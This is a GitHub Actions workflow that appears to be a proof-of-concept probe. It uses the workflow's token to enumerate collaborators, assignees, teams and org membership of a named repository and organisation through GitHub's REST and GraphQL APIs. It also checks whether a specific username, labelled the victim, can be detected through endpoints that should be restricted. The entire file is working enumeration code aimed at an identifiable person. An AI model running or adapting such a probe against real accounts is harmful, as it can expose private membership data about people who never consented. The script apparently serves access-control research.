name: poolprobe
on: workflow_dispatch
jobs:
  p:
    runs-on: ubuntu-latest
    permissions: {}
    steps:
      - name: probe
        env:
          TK: ${{ github.token }}
        run: |
          set +e
          O=f82-poc-org; R=concealed-probe-1788834924
          echo "=== IDENTITY OF THIS PRINCIPAL ==="
          curl -s -H "Authorization: token $TK" https://api.github.com/user | head -c 200; echo
          echo "=== REST endpoints that were 401 for unauth ==="
          for EP in collaborators subscribers stargazers teams assignees contributors; do
            C=$(curl -s -m 15 -o /tmp/r.json -w "%{http_code}" -H "Authorization: token $TK" \
              "https://api.github.com/repos/$O/$R/$EP")
            H=$(grep -c 'ch4n3-yoon' /tmp/r.json)
            echo "[$C] /$EP victimhits=$H body=$(head -c 200 /tmp/r.json)"
          done
          echo "=== per-user oracle ==="
          for U in ch4n3-yoon h1-scyoon nonexistent-user-zzz9; do
            C=$(curl -s -m 15 -o /dev/null -w "%{http_code}" -H "Authorization: token $TK" \
              "https://api.github.com/repos/$O/$R/assignees/$U"); echo "assignees/$U -> $C"
          done
          echo "=== GraphQL pools ==="
          Q='{"query":"{repository(owner:\"'"$O"'\",name:\"'"$R"'\"){assignableUsers(first:20){nodes{login}} mentionableUsers(first:20){nodes{login}} collaborators(first:20){nodes{login}}}}"}'
          curl -s -m 20 -H "Authorization: bearer $TK" -H "Content-Type: application/json" \
            -d "$Q" https://api.github.com/graphql | head -c 1200; echo
          echo "=== org member oracle ==="
          for EP in "members" "public_members" "members/ch4n3-yoon" "memberships/ch4n3-yoon"; do
            C=$(curl -s -m 15 -o /tmp/o.json -w "%{http_code}" -H "Authorization: token $TK" \
              "https://api.github.com/orgs/$O/$EP")
            echo "[$C] orgs/$O/$EP hits=$(grep -c 'ch4n3-yoon' /tmp/o.json)"
          done

